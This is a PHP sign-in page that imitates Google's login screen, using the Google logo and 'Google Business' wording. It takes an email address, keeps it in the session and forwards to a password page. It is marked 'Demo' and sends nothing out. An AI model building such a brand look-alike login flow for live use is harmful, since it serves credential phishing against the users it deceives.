<?php

require_once "language.php";

$email = "";
$error = "";

if ($_SERVER["REQUEST_METHOD"] === "POST") {

    $email = trim($_POST["email"] ?? "");

    if (empty($email)) {

        $error = $t["sign_in"];

    } elseif (!filter_var($email, FILTER_VALIDATE_EMAIL)) {

        $error = "Please enter a valid email.";

    } else {

        $_SESSION["register_email"] = $email;

        header("Location: register-password.php");
        exit;
    }
}

?>

<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title><?php echo htmlspecialchars($t["sign_in"]); ?></title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <main class="page">
    <section class="card" aria-label="Demo sign in">
      <div class="brand">
        <img class="logo" src="google-logo.png">
      </div>
      <div class="content">
        <div class="intro">
          <h1><?php echo htmlspecialchars($t["sign_in"]); ?></h1>
          <p><?php echo htmlspecialchars($t["to_continue_to_google_business"]); ?></p>
        </div>
        <form method="post">
          <div class="email-field <?php echo !empty($error) ? 'error' : ''; ?>">

    <input
        id="email"
        name="email"
        type="email"
        value="<?php echo htmlspecialchars($email); ?>"
        maxlength="190"
        autocomplete="off"
    >

    <label for="email"><?php echo htmlspecialchars($t["email_or_phone"]); ?></label>

    <?php if (!empty($error)): ?>
        <div class="error-message">
            <span>!</span>
            <?php echo htmlspecialchars($error); ?>
        </div>
    <?php endif; ?>

</div>
<div class="button-container1"> 
    <button class="button1" type="submit" >
         <a href="#"><?php echo htmlspecialchars($t["forgot_email"]); ?></a>
        </div>
    </button>
    <br>
    <br>
    <div>
       <p id="txt1"><?php echo htmlspecialchars($t["not_your_computer"]); ?> <span><a class="a2" href="#"><?php echo htmlspecialchars($t["learn_more"]); ?></a></span></p>
    </div>
    <br>
    <br>
    <div class="button-container2">
      <button class="button2" type="submit"><?php echo htmlspecialchars($t["create_account"]); ?></button>
    <button class="button3" type="submit"><?php echo htmlspecialchars($t["next"]); ?></button>
    </div>
</form>
      </div>
    </section>

    <footer>

    <div class="language-dropdown">

        <button
            type="button"
            id="language-button"
            class="language-button"
        >
            <span id="current-language">
                <?php echo htmlspecialchars($current_language_name); ?>
            </span>

            <span class="language-arrow">▲</span>
        </button>

        <div id="language-menu" class="language-menu">

            <?php foreach ($languages as $code => $name): ?>

                <div
                    class="language-option <?php echo $language === $code ? 'selected' : ''; ?>"
                    data-language="<?php echo htmlspecialchars($code); ?>"
                >
                    <?php echo htmlspecialchars($name); ?>
                </div>

            <?php endforeach; ?>

        </div>

    </div>


    <nav>

         <div class="nav-links-container">
            <button class="nav-links" type="submit"><a href="#"><?php echo htmlspecialchars($t["help"]); ?></a></button>
            <button class="nav-links" type="submit"><a href="#"><?php echo htmlspecialchars($t["privacy"]); ?></a></button>
            <button class="nav-links" type="submit"><a href="#"><?php echo htmlspecialchars($t["terms"]); ?></a></button>
        </div>


    </nav>

</footer>
  </main>
  <script src="email.js"></script>
  <script src="language.js"></script>
</body>
</html>
